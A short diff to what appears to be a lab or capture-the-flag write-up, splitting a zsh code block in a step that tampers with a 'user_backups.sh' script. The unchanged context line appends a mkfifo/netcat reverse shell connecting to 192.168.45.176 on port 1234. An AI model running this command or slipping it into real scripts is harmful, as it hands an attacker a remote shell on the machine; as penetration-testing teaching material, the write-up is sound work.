@@ -315,7 +315,9 @@ cd .scripts
 
 ```zsh
 echo >> user_backups.sh
+```
 
+```zsh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.176 1234 >/tmp/f" >> user_backups.sh
 ```
 
